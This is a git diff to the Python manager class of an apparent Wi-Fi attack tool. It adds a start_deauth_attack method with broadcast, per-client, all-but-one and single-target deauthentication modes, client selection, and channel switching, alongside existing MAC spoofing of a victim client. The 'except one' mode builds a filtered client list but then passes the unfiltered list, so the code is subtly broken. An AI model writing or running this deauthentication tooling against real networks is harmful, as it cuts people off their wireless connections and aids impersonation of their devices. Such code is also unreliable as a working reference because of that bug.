@@ -1,6 +1,7 @@
 from .interface import Interface
 from .menu_helper import print_message
 from modules.scanner import Scanner
+from modules.deauther import Deauther
 import os
 import re
 
@@ -12,7 +13,11 @@ class Manager:
         self.targets = []
         self.chosen_target = None
         self.scanner = None
-        self.attack_type = None
+        self.deauther = None
+        self.attack_type = 1
+        self.spoofed = False
+        self.ignore_mac = None
+        self.target_client = None
 
     def read_interfaces(self):
         self.read_airmon_information()
@@ -156,6 +161,9 @@ class Manager:
     def set_interface_up(self):
         os.popen(f"ifconfig {self.chosen_interface.interface} up").read()
     
+    def set_interface_channel(self,interface_name,channel):
+        os.popen(f"iwconfig {interface_name} channel {channel}").read()
+    
     def start_scan(self):
         if self.chosen_interface.mode != "Monitor":
             print_message("Interface not in monitor mode! Putting into monitor mode automatically..",'yellow')
@@ -192,13 +200,66 @@ class Manager:
 
     def select_attack_type(self,option):
         """
-            "1.Deauth all clients",
-            "2.Deauth all clients besides me (if in same network)",
-            "3.Deauth specific client",
+            "Deauth all clients (broadcast)",
+            "Deauth all clients (deauth every single)",
+            "Deauth all clients except one (f.i yourself) ",
+            "Deauth specific client",
         """
+        if self.spoofed:
+            print_message('You spoofed the address of a client. Therefore you are going to be disconnected','red',time_delay=3)
         self.attack_type = option          
+
+    def select_target_client(self,option):
+        client = self.chosen_target.clients[option-1]
+        bssid = client.station
+        self.target_client = bssid
     
     def spoof_mac_address_of_client(self,option):
         client = self.chosen_target.clients[option-1]
         bssid = client.station
         self.set_custom_mac_address(bssid)
+    
+
+    #TODO checken ob ap gewaehlt
+    def start_deauth_attack(self):
+        #for deauth use standard interface
+        default_interface = self.chosen_interface.interface.replace('mon','')
+        # set channel of default_interface to ap channel
+        self.set_interface_channel(default_interface,self.chosen_target.channel)
+
+        #* Broadcast deauth
+        if self.attack_type == 1:
+            self.deauther = Deauther(
+                # 'test','test'
+                default_interface,
+                self.chosen_target.bssid,
+                )
+            self.deauther.start_broadcast_deauth_attack()
+        #* deauth each separately
+        if self.attack_type == 2:
+            prepared_clients = [self.chosen_target.clients[i].station for i,client in enumerate(self.chosen_target.clients)]
+            self.deauther = Deauther(
+                default_interface,
+                self.chosen_target.bssid,
+                clients=prepared_clients
+                )
+            self.deauther.start_multi_client_deauth_attack() 
+        #* deauth each separately except one
+        if self.attack_type == 3:
+            prepared_clients = [self.chosen_target.clients[i].station for i,client in enumerate(self.chosen_target.clients)]
+            without_ignore_mac = [bssid for bssid in prepared_clients if bssid != self.ignore_mac]
+            self.deauther = Deauther(
+                default_interface,
+                self.chosen_target.bssid,
+                clients=prepared_clients
+                )
+            self.deauther.start_multi_client_deauth_attack() 
+        #* deauth specific one
+        if self.attack_type == 4:
+            self.deauther = Deauther(
+                default_interface,
+                self.chosen_target.bssid,
+                client=self.target_client
+                )
+            self.deauther.start_specific_client_deauth_attack() 
+        
